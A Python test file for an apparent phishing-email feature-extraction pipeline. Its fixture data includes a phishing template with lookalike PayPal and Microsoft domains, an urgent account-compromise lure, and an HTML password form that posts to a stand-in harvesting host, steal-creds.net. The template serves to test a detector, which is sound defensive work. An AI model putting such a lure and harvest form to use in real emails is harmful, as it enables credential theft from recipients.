"""
Integration tests for the FeaturePipeline — validates that:
  1. fit_transform() produces a consistent feature matrix shape
  2. transform_single() produces the same number of features
  3. Pipeline can be saved and reloaded with identical output
  4. Feature extraction handles broken/malformed emails gracefully
  5. Feature count is within expected range
"""

from __future__ import annotations

import tempfile
from pathlib import Path

import numpy as np
import pandas as pd
import pytest

from src.features.pipeline import FeaturePipeline
from src.utils.config import DEFAULT_CONFIG


# ---------------------------------------------------------------------------
# Fixtures: synthetic email dataset (50 emails, no network calls)
# ---------------------------------------------------------------------------

PHISHING_EMAIL_TEMPLATE = """From: security-alert@{domain}
Reply-To: attacker@freeemail.net
To: victim@corp.com
Subject: Urgent: Your account has been compromised
Date: Mon, 01 Jan 2024 12:00:00 +0000
Message-ID: <phish{idx}@{domain}>
Content-Type: text/html

<html><body>
<p>Dear customer, your account was accessed from an unusual location.</p>
<a href="http://paypal-verify-{idx}.xyz/login?ref=paypal">Verify Now Immediately</a>
<form action="http://steal-creds.net/collect" method="post">
<input type="password" name="pass"></form>
</body></html>
"""

LEGIT_EMAIL_TEMPLATE = """From: newsletter@{company}.com
To: subscriber@example.com
Subject: Your monthly newsletter - {company}
Date: Mon, 01 Jan 2024 12:00:00 +0000
Message-ID: <newsletter{idx}@{company}.com>
Content-Type: text/plain

Hi there,

Thanks for subscribing to our newsletter. Here is your monthly digest.
Visit us at https://www.{company}.com for more information.

Unsubscribe: https://www.{company}.com/unsubscribe

Best regards,
The {company} Team
"""


def _make_dataset(n_phishing: int = 25, n_legitimate: int = 25) -> pd.DataFrame:
    """Create a small synthetic dataset for pipeline integration tests."""
    domains = ["phish-bank.xyz", "paypal-secure.net", "amazon-login.club",
               "microsoft-verify.info", "apple-id-secure.biz"]
    companies = ["acme", "widgets", "startup", "techcorp", "globalco"]

    rows = []
    for i in range(n_phishing):
        raw = PHISHING_EMAIL_TEMPLATE.format(
            domain=domains[i % len(domains)], idx=i
        )
        rows.append({"raw_email": raw, "label": 1, "source": "test_synthetic"})
    for i in range(n_legitimate):
        raw = LEGIT_EMAIL_TEMPLATE.format(
            company=companies[i % len(companies)], idx=i
        )
        rows.append({"raw_email": raw, "label": 0, "source": "test_synthetic"})

    df = pd.DataFrame(rows).sample(frac=1, random_state=42).reset_index(drop=True)
    return df


@pytest.fixture(scope="module")
def small_dataset():
    return _make_dataset(25, 25)


@pytest.fixture(scope="module")
def offline_pipeline():
    """Offline pipeline: no network, no intelligence APIs, no Gemini, no TF-IDF."""
    return FeaturePipeline(
        config=DEFAULT_CONFIG,
        use_network=False,
        use_intelligence_apis=False,
        use_gemini=False,
        use_tfidf=False,
    )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestPipelineFitTransform:
    def test_fit_transform_produces_matrix(self, small_dataset, offline_pipeline):
        X, names = offline_pipeline.fit_transform(small_dataset)
        assert isinstance(X, np.ndarray)
        assert X.ndim == 2
        assert X.shape[0] == len(small_dataset)

    def test_feature_count_reasonable(self, small_dataset, offline_pipeline):
        X, names = offline_pipeline.fit_transform(small_dataset)
        # Without TF-IDF: header(12) + URL(~29) + HTML(11) + text(392) + intel(13) ≈ 450+
        assert X.shape[1] > 400, f"Expected >400 features, got {X.shape[1]}"
        assert X.shape[1] < 2000, f"Expected <2000 features, got {X.shape[1]}"

    def test_feature_names_match_columns(self, small_dataset, offline_pipeline):
        X, names = offline_pipeline.fit_transform(small_dataset)
        assert len(names) == X.shape[1]

    def test_no_all_nan_columns(self, small_dataset, offline_pipeline):
        X, _ = offline_pipeline.fit_transform(small_dataset)
        nan_cols = np.isnan(X).all(axis=0).sum()
        assert nan_cols == 0, f"{nan_cols} all-NaN columns found"

    def test_no_inf_values(self, small_dataset, offline_pipeline):
        X, _ = offline_pipeline.fit_transform(small_dataset)
        assert not np.isinf(X).any(), "Infinite values found in feature matrix"


class TestTransformSingle:
    def test_single_transform_consistent_shape(self, small_dataset, offline_pipeline):
        offline_pipeline.fit(small_dataset)
        X_batch, names = offline_pipeline.transform(small_dataset.head(1))
        X_single, _ = offline_pipeline.transform_single(small_dataset.iloc[0]["raw_email"])
        assert X_single.shape[1] == X_batch.shape[1]

    def test_single_transform_returns_2d(self, small_dataset, offline_pipeline):
        offline_pipeline.fit(small_dataset)
        X, names = offline_pipeline.transform_single(small_dataset.iloc[0]["raw_email"])
        assert X.ndim == 2
        assert X.shape[0] == 1


class TestPipelineSaveLoad:
    def test_save_and_load_produces_identical_output(self, small_dataset, offline_pipeline):
        X_before, names_before = offline_pipeline.fit_transform(small_dataset)

        with tempfile.TemporaryDirectory() as tmpdir:
            save_path = str(Path(tmpdir) / "pipeline.pkl")
            offline_pipeline.save(save_path)
            loaded = FeaturePipeline.load(save_path)

        X_after, names_after = loaded.transform(small_dataset)
        assert X_before.shape == X_after.shape
        assert names_before == names_after


class TestBrokenEmailHandling:
    def test_malformed_email_does_not_crash(self, offline_pipeline):
        df = pd.DataFrame({"raw_email": [
            "",
            "Not an email at all — just random text",
            "Subject: test\n\n" + "A" * 10000,   # Very long body
            "From: \x00\x01\x02\x03",             # Binary garbage
        ]})
        offline_pipeline.fit(df)
        X, names = offline_pipeline.transform(df)
        assert X.shape[0] == len(df)
        assert not np.isnan(X).any()
